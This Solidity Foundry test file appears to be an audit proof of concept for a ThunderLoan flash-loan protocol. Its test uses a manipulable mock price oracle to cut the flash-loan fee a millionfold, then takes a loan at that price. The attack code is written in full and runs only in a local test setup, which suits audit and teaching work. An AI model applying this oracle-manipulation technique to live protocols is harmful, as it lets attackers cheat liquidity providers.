// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import { BaseTest } from "./BaseTest.t.sol";
import { ThunderLoan } from "../../src/protocol/ThunderLoan.sol";
import { AssetToken } from "../../src/protocol/AssetToken.sol";
import { ITSwapPool } from "../../src/interfaces/ITSwapPool.sol";
import { ERC1967Proxy } from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract MockTSwapPoolManipulable is ITSwapPool {
    uint256 private s_price = 1e18;

    function setPrice(uint256 price) external {
        s_price = price;
    }

    function getPriceOfOnePoolTokenInWeth() external view override returns (uint256) {
        return s_price;
    }
}

contract MockPoolFactoryManipulable {
    mapping(address => address) private s_pools;

    function createPool(address token) external returns (address) {
        MockTSwapPoolManipulable pool = new MockTSwapPoolManipulable();
        s_pools[token] = address(pool);
        return address(pool);
    }

    function getPool(address token) external view returns (address) {
        return s_pools[token];
    }
}

contract OracleReceiver {
    address private s_owner;
    address private s_thunderLoan;

    constructor(address thunderLoan) {
        s_owner = msg.sender;
        s_thunderLoan = thunderLoan;
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address /* initiator */,
        bytes calldata /*  params */
    )
        external
        returns (bool)
    {
        IERC20(token).approve(s_thunderLoan, amount + fee);
        ThunderLoan(payable(s_thunderLoan)).repay(IERC20(token), amount + fee);
        return true;
    }
}

contract H3OracleManipulationPoC is BaseTest {
    MockPoolFactoryManipulable public manipulableFactory;
    ThunderLoan public newThunderLoan;
    OracleReceiver public attackReceiver;

    function test_POC_H3_oracle_manipulation() public {
        // 1. Setup our manipulable infrastructure
        manipulableFactory = new MockPoolFactoryManipulable();
        
        // Deploy fresh ThunderLoan implementation and proxy
        ThunderLoan impl = new ThunderLoan();
        ERC1967Proxy freshProxy = new ERC1967Proxy(address(impl), "");
        newThunderLoan = ThunderLoan(address(freshProxy));
        newThunderLoan.initialize(address(manipulableFactory));

        // Create pool for tokenA in our manipulable factory
        address poolAddress = manipulableFactory.createPool(address(tokenA));
        MockTSwapPoolManipulable pool = MockTSwapPoolManipulable(poolAddress);

        // Allow tokenA
        vm.prank(newThunderLoan.owner());
        newThunderLoan.setAllowedToken(tokenA, true);

        // LP deposits 1000e18 tokens to provide liquidity
        uint256 depositAmt = 1000e18;
        tokenA.mint(address(this), depositAmt);
        tokenA.approve(address(newThunderLoan), depositAmt);
        newThunderLoan.deposit(tokenA, depositAmt);

        // Deploy attack receiver
        attackReceiver = new OracleReceiver(address(newThunderLoan));

        // 2. Normal State: Get fee at 1:1 price
        pool.setPrice(1e18); // 1:1 price
        uint256 borrowAmt = 100e18;
        uint256 normalFee = newThunderLoan.getCalculatedFee(tokenA, borrowAmt);

        // 3. Attack State: Manipulate price down to near-zero
        pool.setPrice(1e12); // price slashed by 1,000,000x
        uint256 manipulatedFee = newThunderLoan.getCalculatedFee(tokenA, borrowAmt);

        // Execute flash loan under manipulated price
        tokenA.mint(address(attackReceiver), manipulatedFee); // fund the receiver with the tiny fee
        newThunderLoan.flashloan(address(attackReceiver), tokenA, borrowAmt, "");

        // 4. Assertions
        assertGt(normalFee, manipulatedFee, "Normal fee should be greater than manipulated fee");
        assertEq(manipulatedFee, normalFee / 1e6, "Fee should be exactly 1,000,000x cheaper due to manipulation");
    }
}
